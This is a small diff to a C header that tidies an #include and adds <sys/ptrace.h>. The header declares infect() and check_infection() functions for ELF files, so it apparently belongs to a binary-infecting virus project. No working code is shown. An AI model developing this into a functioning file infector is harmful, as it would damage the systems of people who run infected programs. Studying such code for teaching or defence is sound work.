@@ -6,13 +6,14 @@
 # include <string.h>
 # include <dirent.h>
 # include <sys/stat.h>
-#include <sys/wait.h>
+# include <sys/wait.h>
 # include <ctype.h>
 # include <stdbool.h>
 # include <fcntl.h>
 # include <errno.h>
 # include <unistd.h>
 # include <elf.h>
+# include <sys/ptrace.h>
 
 void    infect(FILE *fp, const char *string, size_t len);
 bool    check_infection(FILE *fp, const char *string, size_t len);
